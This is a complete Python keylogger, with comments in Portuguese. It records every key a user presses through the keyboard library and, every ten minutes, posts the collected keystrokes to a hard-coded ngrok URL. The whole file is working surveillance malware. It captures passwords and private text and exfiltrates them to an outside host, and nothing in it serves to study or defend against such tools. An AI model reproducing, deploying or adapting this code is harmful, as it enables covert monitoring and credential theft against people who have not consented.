import keyboard
import requests
from threading import Semaphore, Timer


SEND_REPORT_EVERY = 600 # seconds
DESTINY_URL = "https://ab688e56e1a6.ngrok.io/keylogger"


class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)

    def callback(self, event):
        """
        Este callback é chamado sempre que em evento de teclado acontecer.
        """
        name = event.name

        if len(name) > 1:
            if name == 'space':
                name = ' '
            elif name == 'enter':
                name = '[ENTER]'
            elif name == 'decimal':
                name = '.'
            else:
                name = name.replace(' ', '_')
                name = f"[{name.upper()}]"

        self.log += name

    def send_log(self, url, log):
        data = {'log': log}
        requests.post(url, json=data)

    def report(self):
        """
        Esta função é chamada a cada 'self.interval'.
        Ela envia o email e limpa o log
        """
        if self.log:
            self.send_log(DESTINY_URL, self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
